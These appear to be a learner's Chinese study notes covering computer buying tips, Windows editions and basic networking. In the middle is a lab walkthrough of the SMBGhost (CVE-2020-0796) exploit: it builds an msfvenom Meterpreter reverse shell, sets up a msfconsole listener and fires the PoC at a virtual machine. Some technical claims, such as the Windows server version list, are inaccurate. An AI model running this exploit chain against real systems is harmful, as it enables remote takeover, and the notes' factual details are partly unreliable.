    7、电脑的购买讲解
    电脑笔记本和台式一般都是组装机
    一线品牌溢价严重但售后好
    主看主板（蓝天3），主板坏了就没必要修了，核心，
    Cpu(由频率决定)和显卡以及硬件内存（买电脑主要这几项）
    硬盘固态最大装8t（4-5K）建议买4t和1t
    内存条（32的）16、32（够用了）、64、96（48+48）、128（大部分电脑无法适配）
    WiFi在同一个网络信号里最好的数字越大越好 如WiFi6
    电脑由 硬件-驱动（windows系统多）-系统（坏了重装）-用户

    Windows使用 家庭（阉割） 专业（较好） 企业（最好的） 专业工作站（多开）
    Windows最好装服务器版本 2003（xp） 2008（win7） 2012（win10）2018（win10）
    大多数企业都用win7（2008）

    POC(蓝屏)

    python ./CVE-2020-0796.py 192.168.30.134（写入widow10的IP）

    https://github.com/chompie1337/SMBGhost_RCE_PoC
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=（这里写入的是kali的IP） LPORT=5556 -b ‘\x00’ -i 5 -f python > exploit
    使用vim
    vim exploit 回车
    :%s/buf/USER_PAYLOAD 回车
    :wq! 回车
    将exploit内容替换到exploit.py
    参考https://blog.csdn.net/weixin_63610715/article/details/133847253
    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    show options
    set lhost kali的ip（本机的IP）
    set lport 5555
    run
    python exploit.py -ip 目标（虚拟机的ip）ip

    在第十二行的kali=（这里输入kali终端的IP地址输入ifconfig即可在eth1的第二行）
    上半部分开了一个终端下半部分也开了一个终端，开的两个终端，一个监控一个攻击

    9、计算机网络的讲解

    1、电脑IP讲解

    两台电脑联网网线需要手动设置ip
    广域网全球唯一
    Ipv4范围0到255.255.255.255（2的八次方）每一都为256
    扫c段（专业名词）不只扫的IP地址的c段指的是扫d段获取企业买了多少个IP
    IP地址转换由内网ip通过nat转到公网ip然后出去（回来反之）
    私网IP
    A：10.0.0.0-10.255.255.255
    B；172.16.0.0-172.31.255.255
    C：192.168.0.0-192.168.255.255

    http 省略：80
    https 省略：443

    2、扫描ip地址

    在kali终端使用nmap -p 1-10 （加扫描ip地址）
    如何查询地址ip–>https://x.threatbook.com/在此链接里面可以查询IP地址（如以下图注意搜索的网站不带w和其他东西）
